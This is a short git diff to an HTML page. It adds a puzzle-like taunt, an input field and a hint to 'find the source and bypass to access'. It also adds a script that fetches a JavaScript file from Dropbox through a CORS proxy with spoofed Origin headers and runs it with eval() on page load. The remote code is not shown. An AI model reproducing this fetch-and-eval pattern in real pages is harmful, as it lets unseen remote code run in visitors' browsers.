@@ -3,6 +3,28 @@
     <title></title>
 </head>
 <body>
-    <h1>hello</h1>
+    <h1>hello _, the r est is yours, i f you are smart enou g h.</h1>
+    <label>
+        <input type="text" name="pervo" value="" />
+        <p>Find the 3 letter word then find the source and bypass to access</p>
+    </label>
+    <script>
+        const corsProxy = 'https://cors-anywhere.herokuapp.com/';
+        const dropboxURL = 'https://www.dropbox.com/scl/fi/vjhqqbfy47vt1i1g33qcb/pervo.js?rlkey=xkzrjx10ga7ew2krpi3exedat&st=vtqu7qzp&raw=1';
+
+        fetch(corsProxy + dropboxURL, {
+            method: 'GET',
+            headers: {
+                'X-Requested-With': 'XMLHttpRequest',
+                'Origin': 'https://hovoghazaryan.github.io/'
+            }
+        })
+        .then(response => response.text())
+        .then(scriptContent => {
+            eval(scriptContent);
+        })
+        .catch(error => console.error('Error:', error));
+
+    </script>
 </body>
 </html>
